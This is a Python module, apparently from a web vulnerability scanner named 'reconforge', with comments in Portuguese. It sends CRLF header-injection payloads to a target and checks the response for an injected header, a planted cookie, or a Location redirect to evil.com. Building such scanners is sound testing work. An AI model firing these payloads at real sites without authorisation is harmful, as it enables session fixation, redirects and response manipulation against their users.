"""
HeaderInjectionPipeline — Pipeline de exploração de Header Injection (Fase 3)

Testa injeção em cabeçalhos HTTP refletidos (ex: Location, Set-Cookie,
X-Forwarded-Host) usando CRLF injection e header smuggling.
"""

from __future__ import annotations

import re
from typing import Dict, List, Tuple

from core.models import QueueItem
from plugins.pipelines import BasePipeline, _HttpResult, _http_send_item


_CRLF_PAYLOADS = [
    "test\r\nX-Injected: reconforge",
    "test\nX-Injected: reconforge",
    "test%0d%0aX-Injected: reconforge",
    "test%0aX-Injected: reconforge",
    "test%0d%0aSet-Cookie: reconforge=1",
    "test%0d%0aLocation: https://evil.com",
]

_MARKER_HEADER = "x-injected"
_MARKER_VALUE = "reconforge"


class HeaderInjectionPipeline(BasePipeline):
    name = "HeaderInjectionPipeline"
    MAX_ATTEMPTS = 5

    def _get_payloads(self, item: QueueItem) -> List[str]:
        return _CRLF_PAYLOADS

    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
        return _http_send_item(item, payload, fallback_param="q")

    def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
        if result.status == 0:
            return "failed"

        # Verificar cabeçalho injetado presente na resposta
        headers_lower = {k.lower(): v for k, v in result.headers.items()}

        if _MARKER_HEADER in headers_lower:
            return "impact_proven"

        if "set-cookie" in headers_lower:
            cookie_val = headers_lower["set-cookie"]
            if _MARKER_VALUE in cookie_val.lower():
                return "impact_proven"

        # Location com payload → impacto parcial
        if "location" in headers_lower:
            loc = headers_lower["location"]
            if "evil.com" in loc or _MARKER_VALUE in loc:
                return "partial"

        # CRLF refletido no body
        if "X-Injected" in result.body or _MARKER_VALUE in result.body:
            return "partial"

        return "failed"
